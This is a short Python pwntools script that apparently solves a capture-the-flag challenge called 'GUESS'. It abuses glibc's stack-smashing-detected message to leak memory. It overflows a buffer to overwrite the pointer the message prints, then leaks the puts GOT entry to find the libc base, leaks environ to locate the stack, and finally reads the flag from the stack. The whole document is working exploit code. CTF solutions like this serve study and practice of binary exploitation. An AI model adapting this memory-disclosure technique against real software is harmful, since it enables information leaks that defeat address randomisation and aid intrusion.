from pwn import *
p = process("./GUESS")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
elf = ELF("./GUESS")
offset = 0x7fffffffdee8 - 0x7fffffffddc0
def smashes(address):
	payload = "a" * offset + p64(address)
	p.sendlineafter("Please type your guessing flag\n",payload)
	p.recvuntil("*** stack smashing detected ***: ")
	return p.recvuntil(" terminated",drop=True).ljust(8,"\x00")
puts_got = elf.got["puts"]
puts_addr = u64(smashes(puts_got))
log.success("puts_addr:"+hex(puts_addr))
libc.address = puts_addr - libc.symbols["puts"]
log.success("libc_base:"+hex(libc.address))
stack_addr = u64(smashes(libc.symbols["environ"]))
log.success("stack_addr:"+hex(stack_addr))
flag_addr = 0x7fffffffddf0 - 0x7fffffffdf58 + stack_addr
print smashes(flag_addr)
